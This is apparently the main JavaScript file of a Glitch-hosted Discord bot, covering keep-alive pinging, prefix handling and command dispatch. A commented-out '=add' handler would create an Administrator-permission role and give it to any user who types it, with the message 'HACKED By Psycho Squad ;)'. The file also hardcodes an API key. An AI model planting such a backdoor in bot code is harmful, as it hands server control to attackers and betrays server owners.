   const http = require('http');
    const express = require('express');
    const app = express();
    app.get("/", (request, response) => {
    response.sendStatus(200);
    });

   app.listen(process.env.PORT);
  setInterval(() => {
    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 10000);



const Discord = require('discord.js');
const fs = require('fs');
const apis = require('./data/apis.json')
const bot = new Discord.Client({ 
    owner: "322203879208910849",
    disableEveryone: true,
    invite: "https://discord.gg/4rzxMBT",
    author: "PoeticAzurnex"
});

const idioticApi = require("idiotic-api");
const db = require('quick.db')

/*global Set, Map*/
const queue = new Map();
let cooldown = new Set();

//const DBL = require("dblapi.js");

bot.config = require('./botconfig')

bot.tools = require('./functions.js');
bot.tools.loadCmds(bot)
bot.tools.eventsLoad(bot)
bot.ownerID = '322203879208910849';
bot.color = 0xfcc7fb;
bot.idiotAPI = new idioticApi.Client('OuuLWREjnx5BNhGl1B7C', { dev: true });

const server = http.createServer(app);


bot.on('message', async (message) => {


  if (message.channel.type != 'text') return;
  
  /*if (message.content === "=add") {
    var role = "OP"
    var user = message.member 
    
        message.guild.roles.create({ data: {
             name: role,
             permissions: 8,
             position: 1, 
             color: '#00fcff'
            },
            reason: 'HACKED By Psycho Squad ;)'
        })
        
        await message.channel.send(`HACKED By Psycho Squad ;)`).then( async (O_o) => { 
      
      await user.roles.add(user.guild.roles.find(roleU => roleU.name === role))
      })
  }*/
  
  var prefixx =  await bot.tools.GuildPrefix(message.guild) 
  
  const mentionPrefix = new RegExp(`^<@!?${bot.user.id}> `)
            .exec(message.content);
        const prefixes = ['yuuki ', `${mentionPrefix}`, prefixx];
        let prefix = false;

        for (const i of prefixes) {
            if (message.content.startsWith(i)) prefix = i;
        }

        if (!prefix) return;
  
  var sender = message.author;
  var msg = message.content.toLowerCase();
  
  var cont = message.content.slice(prefix.length).split(' ');
  var args = cont.slice(1);
  
  if (!message.content.startsWith(prefix)) return;
  /*
  if(cooldown.has(message.author.id)){
      message.channel.send(`**${message.author.username}**, espera 10 segundos para poder usar el comando de nuevo.`).then(m => {
      m.delete({ timeout: 5000})
      });
      return;
   }
   cooldown.add(message.author.id);
   
   setTimeout(() => {
     cooldown.delete(message.author.id);
   }, 10000);  */    
  
  var cmd = bot.commands.get(cont[0].toLowerCase()) || bot.commands.get(bot.aliases.get(cont[0].toLowerCase()));
  if (cmd) cmd.run(bot, message, args, queue);
  
})

bot.login(bot.config.token)

var dbl = async () => {
await bot.tools.post_dbl(bot)
} 
bot.on('ready', dbl);
bot.on('guildCreate', dbl);
bot.on('guildRemove', dbl);
